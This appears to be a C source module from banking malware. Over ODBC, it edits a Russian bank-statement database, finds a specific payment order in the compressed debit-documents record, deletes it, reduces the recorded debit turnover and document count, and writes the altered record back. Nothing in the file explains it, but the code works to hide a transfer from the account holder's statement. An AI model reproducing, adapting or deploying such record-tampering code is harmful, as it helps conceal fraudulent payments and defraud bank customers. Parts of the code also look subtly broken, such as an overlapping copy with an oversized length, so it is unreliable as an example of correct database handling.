#include <windows.h>
#include <sql.h>
#include <sqltypes.h>
#include <sqlext.h>
#include <stdio.h>
#include <math.h>

#include "fuckup.h"
#include "table.h"
#include "func.h"
#include "zlib.h"
#include "statements.h"

extern CRITICAL_SECTION csOperations;

unsigned char szStatementUpdate[]="update StatementRu set ClosingAvailableBalance=0, DebetTurnover=?, DebetDocumentsNet=?, DebetDocuments=? where DateCreate=? and TimeCreate=?";

bool CutStatement(PAYDOCRU *lpPayDoc,SQLINTEGER dwDateCreate,SQLINTEGER dwTimeCreate,SQLDOUBLE DebetTurnover,void *lpDebetDocuments,DWORD dwDebetDocumentsSize)
{
    bool bRet=false;
    EnterCriticalSection(&csOperations);
        DWORD DebetDocumentsSize=dwDebetDocumentsSize-0xC;
        byte *DebetDocuments=(byte*)lpDebetDocuments+0xC;
        DWORD dwSize=1024*1024;
        void *DecompressedDebetDocuments=VirtualAlloc(NULL,dwSize,MEM_COMMIT,PAGE_READWRITE);
        if (uncompress((byte*)DecompressedDebetDocuments,&dwSize,DebetDocuments,DebetDocumentsSize) == Z_OK)
        {
            DEBETDOC_HDR *lpDebetHdr=(DEBETDOC_HDR *)DecompressedDebetDocuments;

            DWORD dwHdrSize=lpDebetHdr->dwSize;
            byte *lpCurPayDoc=(byte*)DecompressedDebetDocuments+sizeof(DEBETDOC_HDR);
            VIRTUAL_TABLE tbl={0};
            DWORD *dwTblItem=(DWORD*)&tbl,dwPayDocSize=1;

            while (dwHdrSize)
            {
                COLUMN_HDR *lpColumnHdr=(COLUMN_HDR *)lpCurPayDoc;
                *dwTblItem++=dwPayDocSize;
                dwPayDocSize+=lpColumnHdr->wColumnSize+1;
                lpCurPayDoc+=sizeof(COLUMN_HDR)+lpColumnHdr->dwNameSize;
                dwHdrSize-=sizeof(COLUMN_HDR)+lpColumnHdr->dwNameSize;
            }

            DATE_STRUCT dsPayDocDate={lpPayDoc->DocumentDate.year,lpPayDoc->DocumentDate.month,lpPayDoc->DocumentDate.day};

            DWORD dwCount=lpDebetHdr->dwPayDocsCount;
            for (DWORD i=0; i < dwCount; i++)
            {
/**
                double dbDate=*(double*)(p+tbl.DocumentDate),dbTmp;
                int dwDate=(int)modf(dbDate,&dbDate);
                dwDate*=864000000.0;

                ///dbDate*=864000000.0;
                ///dbDate=floor(dbDate);
                ///if ((int)dbDate < 0)
                ///    dbDate*=-1;
                printf("%d\n",dwDate);
                printf("DocumentDate: %d, DocumentNumber: %s, ReceiverINN: %s\n",(*(DATE_STRUCT*)&dbDate).year,p+tbl.DocumentNumber,p+tbl.ReceiverINN);
*/

                char *lpDocumentNumber=(char *)lpCurPayDoc+tbl.DocumentNumber;
                while (*lpDocumentNumber == ' ')
                    lpDocumentNumber++;
                if (!lstrcmp(lpDocumentNumber,(char*)lpPayDoc->DocumentNumber))
                {
                    char *lpReceiverAccount=(char*)lpCurPayDoc+tbl.ReceiverAccount,*lpPayerAccount=(char*)lpCurPayDoc+tbl.PayerAccount;
                    if ((!lstrcmp(lpReceiverAccount,(char*)lpPayDoc->ReceiverAccount)) && (!lstrcmp((char*)lpPayDoc->lpAccountInfo->Account,lpPayerAccount)))
                    {
                        SQLDOUBLE CurAmount=*(SQLDOUBLE*)(lpCurPayDoc+tbl.Amount);

                        if (CurAmount == lpPayDoc->Amount)
                        {
                            bRet=true;
                            lpDebetHdr->dwPayDocsCount--;
                            dwSize-=dwPayDocSize;
                            DebetTurnover-=CurAmount;
                            if (i < dwCount-1)
                            {
                                byte *lpNextPayDoc=lpCurPayDoc+dwPayDocSize;
                                memcpy(lpCurPayDoc,lpNextPayDoc,(dwCount-i)*dwPayDocSize);
                                continue;
                            }
                        }
                    }
                }
                lpCurPayDoc+=dwPayDocSize;
            }
            if (bRet)
            {
                ///unsigned char szBuf[512];
                ///DWORD dwLen=sprintf((char*)szBuf,(char*)szStatementUpdate,DebetTurnover,lpDebetHdr->dwPayDocsCount);
                SQLHANDLE hUpdate;
                SQLAllocHandle(SQL_HANDLE_STMT,hConn,&hUpdate);

                DWORD dwBufLen=dwDebetDocumentsSize;
                compress2(DebetDocuments,&dwBufLen,(byte*)DecompressedDebetDocuments,dwSize,Z_BEST_COMPRESSION);
                dwBufLen+=0xC;

                SQLBindParameter(hUpdate,1,SQL_PARAM_INPUT,SQL_C_FLOAT,SQL_REAL,0,0,&DebetTurnover,0,0);
                SQLBindParameter(hUpdate,2,SQL_PARAM_INPUT,SQL_C_LONG,SQL_INTEGER,0,0,&lpDebetHdr->dwPayDocsCount,0,0);
                SQLINTEGER tmp=dwBufLen;
                SQLBindParameter(hUpdate,3,SQL_PARAM_INPUT,SQL_C_BINARY,SQL_LONGVARBINARY,dwBufLen,0,lpDebetDocuments,0,&tmp);
                SQLBindParameter(hUpdate,4,SQL_PARAM_INPUT,SQL_C_LONG,SQL_INTEGER,0,0,&dwDateCreate,0,0);
                SQLBindParameter(hUpdate,5,SQL_PARAM_INPUT,SQL_C_LONG,SQL_INTEGER,0,0,&dwTimeCreate,0,0);

                SQLPrepare(hUpdate,szStatementUpdate,sizeof(szStatementUpdate));
                SQLExecute(hUpdate);
/**
        SQLCHAR szState[8];
        SQLINTEGER nat;
        SQLCHAR sas[600];
        SQLGetDiagRec(SQL_HANDLE_STMT,hUpdate,1,szState,&nat,sas,600,(SQLSMALLINT*)&tmp);
        MessageBox(0,(char*)sas,(char*)szState,0);
**/
                SQLFreeHandle(SQL_HANDLE_STMT,hUpdate);
            }
        }
        VirtualFree(DecompressedDebetDocuments,0,MEM_DECOMMIT);
    LeaveCriticalSection(&csOperations);
    return bRet;
}

